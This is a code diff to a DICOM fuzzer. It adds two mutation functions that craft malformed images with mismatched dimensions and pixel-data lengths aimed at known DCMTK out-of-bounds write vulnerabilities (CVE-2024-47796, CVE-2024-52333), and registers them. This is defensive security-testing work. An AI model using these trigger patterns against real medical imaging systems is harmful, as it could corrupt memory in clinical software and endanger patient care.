@@ -11,7 +11,7 @@ The CVE patterns guide the fuzzer toward known vulnerability classes, making it
 more effective at finding similar bugs in YOUR software. This approach is
 recommended by FDA guidance (2025) for medical device security testing.
 
-CVEs Covered (24 total mutations across 18 CVEs):
+CVEs Covered (26 total mutations across 20 CVEs):
 
 2025 CVEs:
 - CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing
@@ -30,6 +30,8 @@ CVEs Covered (24 total mutations across 18 CVEs):
 - CVE-2024-28877: MicroDicom stack-based buffer overflow
 - CVE-2024-33606: MicroDicom URL scheme bypass
 - CVE-2024-1453: Sante DICOM Viewer Pro out-of-bounds read
+- CVE-2024-47796: DCMTK out-of-bounds write in nowindow LUT (TALOS-2024-2122)
+- CVE-2024-52333: DCMTK out-of-bounds write in determineMinMax (TALOS-2024-2121)
 
 Legacy CVEs:
 - CVE-2019-11687: DICOM preamble polyglot (PE/DICOM, ELF/DICOM)
@@ -1155,6 +1157,165 @@ def mutate_oob_read_sante_2025(data: bytes) -> bytes:
     return bytes(result)
 
 
+# CVE-2024-47796: DCMTK Out-of-Bounds Write in nowindow LUT processing
+# Cisco Talos: TALOS-2024-2122
+# CVSS: 8.4 (High)
+
+
+def mutate_dcmtk_nowindow_oob_write(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-47796 out-of-bounds write.
+
+    DCMTK vulnerability in nowindow functionality:
+    - Improper array index validation in LUT (look-up table) processing
+    - OOB write when pixel count stored doesn't match expected count
+    - Affects dcmimgle library rendering invalid monochrome DICOM images
+
+    Attack vector: Mismatched pixel counts with LUT pointer manipulation.
+    Reference: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2122
+    """
+    result = bytearray(data)
+
+    # The vulnerability occurs in nowindow LUT processing when:
+    # 1. NumberOfFrames * Rows * Columns doesn't match actual pixel data
+    # 2. LUT array indices are not properly validated
+
+    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
+    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
+    frames_tag = b"\x28\x00\x08\x00"  # (0028,0008) Number of Frames
+    high_bit_tag = b"\x28\x00\x02\x01"  # (0028,0102) High Bit
+    bits_stored_tag = b"\x28\x00\x01\x01"  # (0028,0101) Bits Stored
+
+    # Trigger patterns that cause LUT index overflow
+    # These create mismatches between declared dimensions and actual data
+    lut_overflow_patterns = [
+        # (rows, cols, frames, high_bit, bits_stored)
+        (0xFFFF, 1, 1, 15, 16),  # Max rows with minimal data
+        (1, 0xFFFF, 1, 15, 16),  # Max columns with minimal data
+        (256, 256, 0xFF, 15, 16),  # Many frames
+        (512, 512, 1, 31, 32),  # 32-bit with large dimensions
+        (1024, 1024, 1, 11, 12),  # 12-bit unusual configuration
+    ]
+
+    rows, cols, frames, high_bit, bits_stored = random.choice(lut_overflow_patterns)
+
+    # Modify dimension tags if they exist
+    for tag, value in [
+        (rows_tag, rows),
+        (cols_tag, cols),
+        (high_bit_tag, high_bit),
+        (bits_stored_tag, bits_stored),
+    ]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", value)
+
+    # Handle Number of Frames (IS VR - integer string)
+    frames_idx = data.find(frames_tag)
+    if frames_idx != -1 and frames_idx + 8 < len(result):
+        # Replace with string representation
+        frames_str = str(frames).encode()
+        # Pad to even length
+        if len(frames_str) % 2:
+            frames_str += b" "
+        result[frames_idx + 6 : frames_idx + 8] = struct.pack("<H", len(frames_str))
+        # Insert frames value (may corrupt following data - intentional for fuzzing)
+    else:
+        # Inject Number of Frames element
+        insert_pos = min(300, len(result) - 4)
+        frames_str = str(frames).encode()
+        if len(frames_str) % 2:
+            frames_str += b" "
+        frames_element = (
+            frames_tag + b"IS" + struct.pack("<H", len(frames_str)) + frames_str
+        )
+        result = result[:insert_pos] + frames_element + result[insert_pos:]
+
+    # Set PixelData to size that doesn't match calculated dimensions
+    # This triggers the LUT index overflow
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 12 < len(result):
+        # Set to small size that doesn't match rows*cols*frames*bytes_per_pixel
+        result[idx + 8 : idx + 12] = struct.pack("<I", 128)
+
+    return bytes(result)
+
+
+# CVE-2024-52333: DCMTK Out-of-Bounds Write in determineMinMax
+# Cisco Talos: TALOS-2024-2121
+# CVSS: 8.4 (High)
+
+
+def mutate_dcmtk_determine_minmax_oob(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-52333 out-of-bounds write.
+
+    DCMTK vulnerability in determineMinMax functionality:
+    - Improper array index validation in DiInputPixelTemplate
+    - OOB write when processing pixel data with mismatched dimensions
+    - Heap buffer overflow in dcmimgle/diinpxt.h
+
+    Attack vector: Pixel data dimensions that cause array bounds violation.
+    Reference: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2121
+    """
+    result = bytearray(data)
+
+    # The vulnerability is in DiInputPixelTemplate::determineMinMax()
+    # It occurs when pixel array bounds are not validated during min/max calculation
+    # The issue manifests when actual pixel count differs from expected
+
+    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
+    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
+    samples_tag = b"\x28\x00\x02\x00"  # (0028,0002) Samples per Pixel
+    bits_alloc_tag = b"\x28\x00\x00\x01"  # (0028,0100) Bits Allocated
+    planar_tag = b"\x28\x00\x06\x00"  # (0028,0006) Planar Configuration
+
+    # Trigger patterns for determineMinMax overflow
+    # These cause the min/max loop to read/write beyond buffer
+    minmax_overflow_patterns = [
+        # (rows, cols, samples, bits_allocated, planar_config)
+        (0xFFFE, 2, 1, 16, 0),  # Near-max rows, triggers unsigned overflow
+        (2, 0xFFFE, 1, 16, 0),  # Near-max columns
+        (1000, 1000, 3, 8, 1),  # RGB planar with large dims
+        (2048, 2048, 1, 8, 0),  # Large monochrome 8-bit
+        (256, 256, 4, 16, 0),  # RGBA 16-bit
+    ]
+
+    rows, cols, samples, bits, planar = random.choice(minmax_overflow_patterns)
+
+    # Modify tags if they exist
+    for tag, value in [
+        (rows_tag, rows),
+        (cols_tag, cols),
+        (samples_tag, samples),
+        (bits_alloc_tag, bits),
+        (planar_tag, planar),
+    ]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", value)
+
+    # Key to triggering: PixelData size much smaller than expected
+    # Expected size: rows * cols * samples * (bits/8)
+    # Actual size: small value that causes OOB when iterating
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 12 < len(result):
+        # Set to intentionally small size
+        result[idx + 8 : idx + 12] = struct.pack("<I", 64)
+    else:
+        # Inject minimal PixelData
+        pixel_element = (
+            pixel_data_tag
+            + b"OW"
+            + b"\x00\x00"  # Reserved
+            + struct.pack("<I", 64)  # Small length
+            + b"\x00" * 64  # Minimal data
+        )
+        result = result[:-4] + pixel_element + result[-4:]
+
+    return bytes(result)
+
+
 # Registry of all CVE mutations
 
 CVE_MUTATIONS: list[CVEMutation] = [
@@ -1351,6 +1512,24 @@ CVE_MUTATIONS: list[CVEMutation] = [
         category=CVECategory.OUT_OF_BOUNDS_READ,
         description="Sante DICOM Viewer Pro OOB read via pixel dimension mismatch",
         mutation_func="mutate_oob_read_sante_2025",
+        severity="high",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-47796: DCMTK Out-of-Bounds Write in nowindow LUT processing
+    CVEMutation(
+        cve_id="CVE-2024-47796",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="DCMTK OOB write in nowindow LUT processing (TALOS-2024-2122)",
+        mutation_func="mutate_dcmtk_nowindow_oob_write",
+        severity="high",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-52333: DCMTK Out-of-Bounds Write in determineMinMax
+    CVEMutation(
+        cve_id="CVE-2024-52333",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="DCMTK OOB write in determineMinMax (TALOS-2024-2121)",
+        mutation_func="mutate_dcmtk_determine_minmax_oob",
         severity="high",
         target_component="pixel_data",
     ),
